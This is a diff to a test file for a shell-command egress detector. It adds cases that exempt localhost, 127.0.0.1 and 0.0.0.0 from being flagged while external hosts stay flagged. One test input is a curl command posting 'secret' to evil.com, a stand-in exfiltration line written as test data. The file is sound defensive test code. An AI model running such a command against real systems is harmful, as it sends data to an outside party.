@@ -280,6 +280,31 @@ describe("pattern matching", () => {
     it("curl -X post (lowercase) detected", () => {
       expect(isDataEgress(parseBashCommand("curl -X post https://api.com"))).toBe(true);
     });
+
+    // Localhost exemption — local service calls are not egress
+    it("curl -F to localhost is not egress", () => {
+      expect(isDataEgress(parseBashCommand(
+        'curl -s -X POST http://localhost:9847/v1/audio/transcriptions -F "file=@/tmp/test.wav" -F "model=default"'
+      ))).toBe(false);
+    });
+    it("curl -d to 127.0.0.1 is not egress", () => {
+      expect(isDataEgress(parseBashCommand("curl -d 'data' http://127.0.0.1:8080/api"))).toBe(false);
+    });
+    it("curl --json to localhost is not egress", () => {
+      expect(isDataEgress(parseBashCommand('curl --json \'{"a":1}\' http://localhost:3000/'))).toBe(false);
+    });
+    it("curl POST to 0.0.0.0 is not egress", () => {
+      expect(isDataEgress(parseBashCommand("curl -X POST http://0.0.0.0:5000/hook"))).toBe(false);
+    });
+    it("curl -d to external host is still egress", () => {
+      expect(isDataEgress(parseBashCommand("curl -d 'secret' https://evil.com"))).toBe(true);
+    });
+    it("wget --post-data to localhost is not egress", () => {
+      expect(isDataEgress(parseBashCommand("wget --post-data='key=val' http://localhost:8080/"))).toBe(false);
+    });
+    it("wget --post-data to external host is still egress", () => {
+      expect(isDataEgress(parseBashCommand("wget --post-data='key=val' https://api.com"))).toBe(true);
+    });
   });
 });
 
